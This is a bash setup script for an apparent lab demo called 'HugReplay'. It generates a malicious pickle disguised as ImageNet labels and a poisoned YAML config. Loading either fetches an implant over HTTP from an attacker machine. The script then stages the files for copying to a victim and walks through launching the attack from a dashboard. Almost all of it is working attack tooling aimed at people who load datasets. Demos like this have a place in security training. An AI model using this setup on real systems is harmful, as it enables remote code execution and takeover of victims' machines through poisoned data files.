#!/usr/bin/env bash
# =============================================================================
# HugReplay — Demo Setup Script
#
# Generates all artifacts needed for the demo on the attacker machine.
# Run this from the repo root: bash setup_demo.sh
#
# After this script, copy these files to the victim:
#   /tmp/imagenet_labels.pkl   → victim:/tmp/
#   /tmp/dataset_config.yaml   → victim:/tmp/  (if using YAML vector)
#   /tmp/serve/implant.py      → served via HTTP from attacker
# =============================================================================

set -e

ATTACKER_IP="${ATTACKER_IP:-10.4.60.21}"
ATTACKER_PORT="${ATTACKER_PORT:-8080}"
OUT_DIR="/tmp/hugreplay"
CONFIG="config.yaml"

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
NC='\033[0m'

banner() { echo -e "\n${RED}══════════════════════════════════════════${NC}"; echo -e "${RED}  HugReplay — Demo Setup${NC}"; echo -e "${RED}══════════════════════════════════════════${NC}\n"; }
ok()     { echo -e "${GRN}[✓]${NC} $1"; }
warn()   { echo -e "${YLW}[!]${NC} $1"; }
info()   { echo -e "    $1"; }

banner

# ---------------------------------------------------------------------------
# 0. Read attacker IP from config if present
# ---------------------------------------------------------------------------
if [ -f "$CONFIG" ]; then
    _ip=$(python3 -c "import yaml; c=yaml.safe_load(open('$CONFIG')); print(c['lab']['attacker_ip'])" 2>/dev/null)
    [ -n "$_ip" ] && ATTACKER_IP="$_ip"
    ok "Read config.yaml — attacker IP: $ATTACKER_IP"
else
    warn "config.yaml not found — using default attacker IP: $ATTACKER_IP"
    warn "Set ATTACKER_IP=x.x.x.x to override: ATTACKER_IP=1.2.3.4 bash setup_demo.sh"
fi

mkdir -p "$OUT_DIR/serve"

# ---------------------------------------------------------------------------
# 1. Python deps check
# ---------------------------------------------------------------------------
echo -e "\n${YLW}[1/4] Checking Python dependencies...${NC}"
python3 -c "import langgraph, flask, paramiko, yaml" 2>/dev/null \
    && ok "Core dependencies present" \
    || { warn "Missing deps — running: pip3 install -r requirements.txt"; pip3 install -r requirements.txt -q; ok "Dependencies installed"; }

# ---------------------------------------------------------------------------
# 2. Generate malicious pickle (imagenet_labels.pkl)
# ---------------------------------------------------------------------------
echo -e "\n${YLW}[2/4] Generating malicious dataset artifacts...${NC}"

python3 - <<PYEOF
import sys
sys.path.insert(0, '.')
from attacker.techniques.dataset_poison import generate_pickle, generate_yaml, generate_implant

ip = "$ATTACKER_IP"
port = $ATTACKER_PORT
out = "$OUT_DIR"

# Pickle vector
generate_pickle(f"{out}/imagenet_labels.pkl", ip, port)

# YAML vector
generate_yaml(f"{out}/dataset_config.yaml", ip, port)

# Implant (served via HTTP — victim downloads this after pickle trigger)
implant_src = generate_implant(ip, gist_id="__GIST_ID__", webhook_url="__WEBHOOK__")
with open(f"{out}/serve/implant.py", "w") as f:
    f.write(implant_src)

print(f"[+] Implant server script written to {out}/serve/implant.py")
PYEOF

ok "imagenet_labels.pkl  →  $OUT_DIR/imagenet_labels.pkl"
ok "dataset_config.yaml  →  $OUT_DIR/dataset_config.yaml"
ok "implant.py           →  $OUT_DIR/serve/implant.py"

# ---------------------------------------------------------------------------
# 3. Write victim/loader.py to OUT_DIR for easy scp
# ---------------------------------------------------------------------------
echo -e "\n${YLW}[3/4] Staging victim loader...${NC}"
cp victim/loader.py "$OUT_DIR/loader.py"
ok "loader.py            →  $OUT_DIR/loader.py"

# ---------------------------------------------------------------------------
# 4. Summary
# ---------------------------------------------------------------------------
echo -e "\n${YLW}[4/4] Setup complete. Files generated:${NC}\n"
ls -lh "$OUT_DIR/"
echo ""
ls -lh "$OUT_DIR/serve/"

cat <<SUMMARY

${GRN}══════════════════════════════════════════${NC}
${GRN}  NEXT STEPS${NC}
${GRN}══════════════════════════════════════════${NC}

${YLW}1. Copy files to victim (you handle this):${NC}
   scp $OUT_DIR/imagenet_labels.pkl  ubuntu@<VICTIM_IP>:/tmp/
   scp $OUT_DIR/loader.py            ubuntu@<VICTIM_IP>:/tmp/

${YLW}2. Start implant HTTP server on attacker (terminal 1):${NC}
   cd $OUT_DIR/serve && python3 -m http.server $ATTACKER_PORT

${YLW}3. Start dashboard (terminal 2, from repo root):${NC}
   python3 dashboard/app.py
   → http://$ATTACKER_IP:5001

${YLW}4. On victim — simulate the data scientist loading the dataset:${NC}
   python3 /tmp/loader.py --dataset /tmp/imagenet_labels.pkl

${YLW}5. Click "Launch Attack" in the dashboard.${NC}

${YLW}YAML vector (alternative to pickle):${NC}
   scp $OUT_DIR/dataset_config.yaml  ubuntu@<VICTIM_IP>:/tmp/
   python3 /tmp/loader.py --vector yaml --dataset /tmp/dataset_config.yaml

SUMMARY
